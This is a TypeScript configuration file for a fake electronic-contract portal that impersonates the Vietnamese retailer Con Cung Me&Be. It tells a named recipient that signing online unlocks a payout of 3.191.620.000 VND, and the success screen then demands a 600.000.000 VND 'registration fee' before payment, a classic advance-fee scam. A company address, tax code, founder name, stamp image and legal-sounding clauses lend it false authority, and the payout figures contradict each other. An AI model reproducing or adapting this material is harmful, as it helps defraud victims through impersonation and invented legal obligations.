
import { ContractData } from './types';

/**
 * 🏆 MASTER CONFIGURATION CENTER - CONCUNG ME&BE EDITION
 * File này chứa toàn bộ nội dung hiển thị trong ứng dụng.
 * Bạn chỉ cần chỉnh sửa các giá trị ở đây để cập nhật toàn bộ trang web.
 */

export const MASTER_CONFIG: ContractData = {
  // ==========================================
  // 1. THÔNG TIN ĐỊNH DANH CHÍNH
  // ==========================================
  "recipientName": "NGUYEN THI THU",
  "amount": "3.191.620.000 VNĐ",
  "senderName": "LƯU ANH TIẾN",
  "senderTitle": "NGƯỜI SÁNG LẬP",
  "companyName": "CTY TNHH CONCUNG ME&BE",
  "companyAddress": "Số 66 Nguyễn Du, Phường Bến Nghé, Quận 1, Thành Phố Hồ Chí Minh",
  "taxCode": "0313450007",
  "contractCode": "CC-2024/HĐĐT-DH01",
  
  // ==========================================
  // 2. HÌNH ẢNH HỆ THỐNG (CON DẤU & CHỮ KÝ CÓ SẴN)
  // ==========================================
  // Bạn có thể dán link ảnh hoặc mã Base64 vào đây. 
  // Đã xóa link cũ bị lỗi "image not found".
  "senderStampUrl": "https://res.cloudinary.com/dutj4khkq/image/upload/v1770528397/photo_2026-02-08_11-55-21_olbqeb.jpg", 
  "recipientSignatureUrl": "", // Để trống nếu muốn khách hàng tự ký trực tiếp

  // ==========================================
  // 3. NỘI DUNG TRANG CHÀO (WELCOME VIEW)
  // ==========================================
  "welcomeTitle": "Cổng Ký Kết Hợp Đồng Điện Tử",
  "welcomeSubtitle": "Xin Chào khách hàng đã đến với hệ thống xác thực giao dịch an toàn. Vui lòng hoàn tất quy trình để nhận giải ngân 1 lần về tài khoản cá nhân.",
  "welcomeButton": "Bắt đầu xác thực ngay",
  
  // ==========================================
  // 4. NỘI DUNG TRANG THÔNG BÁO (NOTICE VIEW)
  // ==========================================
  "noticeHeading": "Thông báo quy định chi trả giao dịch",
  "noticeMainText": "Để thực hiện việc chi trả khoản tiền 3.191.620.000 VNĐ theo đúng quy định pháp luật về giao dịch điện tử, quý khách bắt buộc phải thực hiện ký kết hợp đồng số trực tuyến. Văn bản này có giá trị pháp lý tương đương hợp đồng giấy.",
  "noticeAlertBox": "LƯU Ý QUAN TRỌNG: Trong trường hợp hợp đồng điện tử chưa được ký hoàn tất, chúng tôi chưa có đủ cơ sở pháp lý để thực hiện chi trả số tiền nêu trên.",
  
  // ==========================================
  // 5. NỘI DUNG TRANG THÀNH CÔNG (SUCCESS VIEW)
  // ==========================================
  "successTitle": "Ký Kết Thành Công!",
  "successFeeText": "Đã ký thành công khách hàng vui lòng tham gia lệ phí đăng ký : 600.000.000VND , sau khi hoàn thành đã đầy đủ hồ sơ thủ tục để nhận 3.791.620.000 VNĐ về số tài khoản cá nhân, trong vòng 10 phút !",
  "successAmountNote": "Giá trị giải ngân thực tế",
  "successTransactionPrefix": "CONCUNG-PAY-SECURE-ID",
  "successSignatureLabel": "DỮ LIỆU CHỮ KÝ ĐIỆN TỬ GHI NHẬN",

  // ==========================================
  // 6. CÁC ĐIỀU KHOẢN HỢP ĐỒNG (CLAUSES)
  // ==========================================
  "clauses": [
    {
      "id": "c1",
      "title": "Điều 1: Chủ thể tham gia",
      "content": "Bên A là đơn vị chi trả dựa trên các thỏa thuận hợp tác. Bên B là cá nhân thụ hưởng đã hoàn tất các điều kiện xác thực."
    },
    {
      "id": "c2",
      "title": "Điều 2: Giá trị Giải ngân và Hình thức Thanh toán",
      "content": "Giá trị giao dịch được ấn định là 3.191.620.000 VNĐ. Số tiền được chi trả một lần qua hệ thống ngân hàng ngay sau khi chữ ký điện tử được xác lập."
    },
    {
      "id": "c3",
      "title": "Điều 3: Cam kết Chung và Bảo mật Thông tin",
      "content": "Lệ Phí đăng ký hợp đồng là: 600.000.000 VND Các bên cam kết bảo mật tuyệt đối nội dung hợp đồng này. Bên B chịu trách nhiệm về tính xác thực của chữ ký số cá nhân. Mọi tranh chấp phát sinh sẽ được giải quyết dựa trên các quy định về giao dịch điện tử của pháp luật Việt Nam."
    }
  ]
};
